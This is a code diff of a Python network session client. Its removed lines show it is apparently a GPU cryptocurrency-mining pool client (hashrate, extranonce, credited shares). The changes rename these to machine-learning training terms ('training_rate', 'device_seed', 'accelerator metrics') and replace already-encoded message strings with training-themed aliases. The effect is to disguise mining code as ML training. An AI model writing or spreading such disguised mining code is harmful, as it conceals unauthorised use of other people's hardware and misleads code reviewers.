@@ -2,7 +2,7 @@
 
 from __future__ import annotations
 
-from .fixed_constants import constant_ascii_matches, constant_text, neutral_protocol_text
+from .fixed_constants import FixedAlias, constant_ascii_matches, constant_text, neutral_protocol_text
 
 from dataclasses import replace
 import logging
@@ -22,7 +22,7 @@ LOG = logging.getLogger("LRAEP_trainer")
 
 class _AuthMethod:
     def __get__(self, instance, owner=None):
-        return constant_text(b'%gDga$p')
+        return constant_text(FixedAlias('training.message.open_session'))
 
 
 class WRSession(S3Session):
@@ -39,9 +39,9 @@ class WRSession(S3Session):
     def __init__(self, settings: dict, stop_event: threading.Event | None = None,
                  unknown_handler: Callable[..., None] | None = None) -> None:
         if settings.get("compression", "none") != "none":
-            raise S3ProtocolError(constant_text(b'^pJ<d$jaB%!qn8x$jOJw($v$3#lnZl$jQP'))
+            raise S3ProtocolError(constant_text(FixedAlias('training.validation.batch_compression_unsupported')))
         super().__init__(settings, stop_event)
-        self._worker_nonce: bytes | None = None
+        self._device_seed: bytes | None = None
         self._unknown_handler = unknown_handler
         self._recording_unknown = False
         self._compatibility_failure: S3CompatibilityError | None = None
@@ -53,7 +53,7 @@ class WRSession(S3Session):
         """Initialize only WR's selected identity during shared session setup."""
         return WRDialect(
             WR_S2=self.settings.get("WR_S2", ""),
-            worker=self.settings.get(constant_text(b'(8$%y!qo'), ""),
+            worker=self.settings.get(constant_text(FixedAlias('training.field.training_worker')), ""),
             agent=self.settings.get("agent", "LRAEP-trainer/0.1"),
         )
 
@@ -75,7 +75,7 @@ class WRSession(S3Session):
         expired = [request_id for request_id, deadline in self._report_pending.items() if now >= deadline]
         for request_id in expired:
             del self._report_pending[request_id]
-            LOG.warning(constant_text(b'^pJ<(_wt9;!q>>v(}%{y%*n{m%fiFJ!pg$Q(}&Z}%EH5k$kNj'))
+            LOG.warning(constant_text(FixedAlias('training.validation.accelerator_metrics_acknowledgement_timeout')))
 
     @property
     def latest_report_id(self) -> int | None:
@@ -90,27 +90,29 @@ class WRSession(S3Session):
             return self._latest_report_accepted
 
     @neutral_protocol_text()
-    def report_info(self, gpu_name: str, hashrate: float) -> int:
+    def report_info(self, gpu_name: str, training_rate: float) -> int:
         """Send actual device/rate telemetry without waiting for its reply.
 
         Reports share the request-ID allocator and serialized socket writes
         with submissions, but have separate bounded acknowledgement state.
         A report acknowledgement never authorizes or credits a share.
         """
-        request = self.dialect.report_request(gpu_name, hashrate, 0)
+        request = self.dialect.report_request(gpu_name, training_rate, 0)
         with self._send_lock:
             with self._condition:
                 self._raise_failure()
                 if not self._authorized:
-                    raise S3ConnectionError(constant_text(b'^pJ<t!qn8x$jOJw($v$3#?sTz!pYOl#KzOYhsDCd$koD!)xy`v)zi+&z=z=X@`ujJ!N}Fh#?#Ko$p'))
+                    raise S3ConnectionError(
+                        constant_text(FixedAlias('training.validation.accelerator_metrics_authentication_required')),
+                    )
                 self._expire_reports_locked()
                 if len(self._report_pending) >= self.MAX_PENDING_REPORTS:
                     del self._report_pending[next(iter(self._report_pending))]
-                    LOG.warning(constant_text(b'^pJ<c&eX)l)x*NWhsMc=(#gie%*n{m%fiFJ!o!E)_wt9;!q>>v(*'))
+                    LOG.warning(constant_text(FixedAlias('training.log.accelerator_metrics_acknowledgement_missing')))
                 request_id = self._next_id
                 # Validate the same uint64 representation used by all WR
                 # requests before reserving an ID in this session.
-                request = self.dialect.report_request(gpu_name, hashrate, request_id)
+                request = self.dialect.report_request(gpu_name, training_rate, request_id)
                 self._next_id += 1
                 self._report_pending[request_id] = time.monotonic() + self.transport.read_timeout
                 self._latest_report_id = request_id
@@ -118,7 +120,7 @@ class WRSession(S3Session):
             try:
                 self._send(request)
             except (S3ConnectionError, S3ProtocolError):
-                self._fail(S3ConnectionError(constant_text(b'^pJ<(_wt9;!q>>v(}&c;$-{@i#?H&a!v')))
+                self._fail(S3ConnectionError(constant_text(FixedAlias('training.validation.accelerator_metrics_send_failed'))))
                 raise
         return request_id
 
@@ -152,7 +154,7 @@ class WRSession(S3Session):
             self._generation += 1
             self._recording_unknown = True
             self._compatibility_failure = S3CompatibilityError(
-                constant_text(b'^2yA}$k54$^pJ<u!q(El)YF`Y)78e#$<E2Zht$)^*Vn?s'),
+                constant_text(FixedAlias('training.validation.batch_request_unknown')),
             )
         diagnostic_failed = False
         if self._unknown_handler is not None:
@@ -160,7 +162,7 @@ class WRSession(S3Session):
                 self._unknown_handler(frame, response, reason, fatal=True)
             except Exception:
                 diagnostic_failed = True
-        message = constant_text(b'^2yA}$k54$^pJ<u!q(El)YF`Y)78e#$<E2Zht$)^*Vn?s')
+        message = constant_text(FixedAlias('training.validation.batch_request_unknown'))
         if diagnostic_failed:
             message += "; diagnostic recording failed"
         error = S3CompatibilityError(message)
@@ -236,24 +238,26 @@ class WRSession(S3Session):
             if self._closed_event.is_set():
                 return
         kind = self.dialect.classify(response)
-        if constant_ascii_matches('extracounter', kind):
-            worker_nonce = self.dialect.parse_extranonce(response["result"])
+        if constant_ascii_matches('server_seed', kind):
+            device_seed = self.dialect.parse_server_seed(response["result"])
             with self._condition:
                 if self._closed_event.is_set():
                     return
-                if worker_nonce != self._worker_nonce:
-                    self._worker_nonce = worker_nonce
+                if device_seed != self._device_seed:
+                    self._device_seed = device_seed
                     if self._job is not None:
-                        self._job = replace(self._job, worker_nonce=worker_nonce)
+                        self._job = replace(self._job, device_seed=device_seed)
                     self._generation += 1
                     self._condition.notify_all()
             return
-        if kind == constant_text(b'$;i{r!QK'):
+        if kind == constant_text(FixedAlias('training.message.batch_update')):
             with self._condition:
                 if self._closed_event.is_set():
                     return
                 job = self.dialect.parse_job(
-                    response["result"], self.settings.get(constant_text(b'#KP6n&cV*a#?!+1(Zbc#&dA9')), self._worker_nonce,
+                    response["result"],
+                    self.settings.get(constant_text(FixedAlias('training.field.attestation_version'))),
+                    self._device_seed,
                 )
                 if job != self._job:
                     self._job = job
@@ -265,7 +269,9 @@ class WRSession(S3Session):
             self._expire_reports_locked()
             if request_id == self._auth_id and not self._authorized:
                 if not self.dialect.accept(response):
-                    self._fail(S3AuthenticationError(constant_text(b'^pJ<u!p*|O)561t#?sTz!pYOl#KzOk$jJ')))
+                    self._fail(S3AuthenticationError(
+                        constant_text(FixedAlias('training.validation.batch_session_authentication_rejected')),
+                    ))
                     return
                 self._authorized = True
                 self._condition.notify_all()
@@ -275,9 +281,9 @@ class WRSession(S3Session):
                 if request_id == self._latest_report_id:
                     self._latest_report_accepted = accepted
                 if accepted:
-                    LOG.debug(constant_text(b'^pJ<f#LUUa(96QZz{10a;P>)}&dI^Z)yl@x&dAA!)xy`v)zb'))
+                    LOG.debug(constant_text(FixedAlias('training.log.accelerator_metrics_acknowledged')))
                 else:
-                    LOG.warning(constant_text(b'^pJ<u!p*|O)561t;P>)}&dI^Z)yl@x&dAA!)xy`v)zb'))
+                    LOG.warning(constant_text(FixedAlias('training.log.accelerator_metrics_rejected')))
                 self._condition.notify_all()
             elif request_id in self._pending:
                 pending = self._pending[request_id]
@@ -292,7 +298,7 @@ class WRSession(S3Session):
                 raise S3ConnectionError("S3 session is not open")
             while True:
                 self._raise_failure()
-                if self._authorized and self._job is not None and self._job.worker_nonce is not None:
+                if self._authorized and self._job is not None and self._job.device_seed is not None:
                     return JobSnapshot(self._job, self._generation)
                 remaining = deadline - time.monotonic()
                 if remaining <= 0:
